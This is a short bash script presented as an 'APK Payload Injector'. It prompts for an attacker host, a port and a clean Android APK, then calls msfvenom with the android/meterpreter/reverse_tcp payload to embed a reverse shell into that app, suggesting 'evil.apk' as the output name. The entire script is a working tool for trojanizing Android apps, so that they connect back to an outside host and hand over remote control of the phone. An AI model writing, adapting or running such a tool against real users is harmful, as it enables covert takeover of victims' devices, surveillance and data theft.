#!/bin/bash

echo "==============================="
echo "        APK Payload Injector   "
echo "==============================="

# Ask for LHOST and LPORT
read -p "🌐 Enter LHOST: " lhost
read -p "🎯 Enter LPORT: " lport

# Loop to ensure the APK file exists
while true; do
    read -p "Enter the path to a clean APK file: " input_apk
    if [ -f "$input_apk" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an APK file."
    fi
done

# Ask for output APK file name
read -p "Enter the output file name (e.g., evil.apk): " output_apk

# Generate and inject the payload
echo "[*] Injecting payload into $input_apk..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -x "$input_apk" -o "$output_apk"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_apk"
else
    echo "[!] Injection failed. Please check your inputs."
fi